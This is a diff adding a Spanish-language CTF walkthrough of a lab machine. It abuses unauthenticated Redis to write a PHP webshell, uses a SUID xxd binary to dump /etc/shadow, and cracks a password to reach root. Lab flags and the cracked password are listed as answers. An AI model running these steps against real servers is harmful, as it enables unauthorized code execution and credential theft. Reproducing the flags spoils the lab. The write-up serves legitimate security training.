@@ -27,7 +27,7 @@
 | 6 | What is the local user account password? | `beautiful1` |
 | 7 | Escalate privileges and obtain root.txt | `thm{xxd_pr1v_escalat1on}` |
 
----
+**Explicación:** El escaneo inicial revela únicamente dos puertos abiertos: 80 (Apache) y 6379 (Redis 6.0.7). Redis no exige autenticación, por lo que con `redis-cli` se puede cambiar la configuración en caliente (`CONFIG SET dir/dbfilename`) y entregar el payload con `SET` + `SAVE`, materializando una webshell PHP en `/var/www/html/shell.php`. Tras obtener el foothold, `find / -perm -4000` muestra `/usr/bin/xxd` con el bit SUID: `xxd "$LFILE" | xxd -r` permite leer cualquier archivo como root, incluido `/etc/shadow`. El hash de `vianka` se rompe con John (wordlist rockyou) y su contraseña es `beautiful1`; con `su vianka` y su sudo total se alcanza una shell de root.
 
 **Metodología:**
 1. **Reconocimiento:** `nmap -sC -sV -p-` contra la máquina revela solo dos puertos: 80 (Apache 2.4.18) y 6379 (Redis key-value store 6.0.7).
@@ -37,6 +37,26 @@
 5. **Enumeración de privilegios:** `find / -type f -perm -4000 2>/dev/null` encuentra `/usr/bin/xxd` con SUID; en GTFOBins se confirma lectura/escritura arbitraria de archivos.
 6. **Lectura de /etc/shadow y crackeo:** `LFILE=/etc/shadow; xxd "$LFILE" | xxd -r` vuelca el shadow; el hash de `vianka` se crackea con `john --wordlist=/usr/share/wordlists/rockyou.txt` dando `beautiful1`.
 7. **Root:** `su vianka` (password `beautiful1`), `sudo -l` muestra permisos `(ALL : ALL) ALL`, y `sudo su` entrega una shell de root, la flag `user.txt` (`thm{red1s_rce_w1thout_credent1als}`), la contraseña local `beautiful1` y `root.txt` (`thm{xxd_pr1v_escalat1on}`).
+
+```
+nmap -> 80 (Apache) + 6379 (Redis 6.0.7)
+              |
+        redis-cli (sin credenciales)
+              |
+  CONFIG SET dir /var/www/html
+  CONFIG SET dbfilename shell.php
+  SET x "<?php system($_GET['cmd']); ?>" + SAVE
+              |
+        webshell.php -> RCE (www-data)
+              |
+    SUID /usr/bin/xxd -> leer /etc/shadow
+              |
+    john -> beautiful1 (vianka) -> su vianka
+              |
+   sudo su -> root -> root.txt
+```
+
+**Lección:** Un servicio expuesto y mal configurado (Redis sin autenticación) puede convertirse directamente en RCE, y un único binario SUID mal habitual (`xxd`) permite leer los ficheros más sensibles del sistema. Siempre endurecer los servicios internos y auditar los binaries con SUID/capabilities.
 
 **Learning chain:** nmap → 80 (Apache) + 6379 (Redis 6.0.7) → redis-cli sin credenciales → CONFIG SET dir/dbfilename + SET + SAVE → webshell.php → RCE (www-data) → SUID /usr/bin/xxd → leer /etc/shadow → john → beautiful1 (vianka) → su vianka → sudo su → root → root.txt
 
